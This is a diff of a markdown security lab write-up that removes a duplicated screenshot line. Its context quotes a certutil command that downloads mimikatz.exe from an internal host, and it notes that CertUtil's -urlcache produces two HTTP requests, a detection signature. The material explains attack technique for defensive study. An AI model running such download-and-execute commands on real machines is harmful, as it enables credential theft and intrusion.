@@ -187,8 +187,6 @@ certutil -urlcache -split -f http://192.168.7.250/mimikatz.exe C:\Windows\System
 
 ![CertUtil Download Execution](Screenshots/7-image.png)
 
-![CertUtil Download Execution](Screenshots/7-image.png)
-
 CertUtil is a certificate management utility being abused here purely as a download mechanism. One behavioral fingerprint I confirmed in my own web server logs: CertUtil's `-urlcache` mechanism generates **two HTTP requests** to the source URL for a single download — a distinguishing signature independent of file name or destination path.
 
 ### Step 2 — Mimikatz Execution
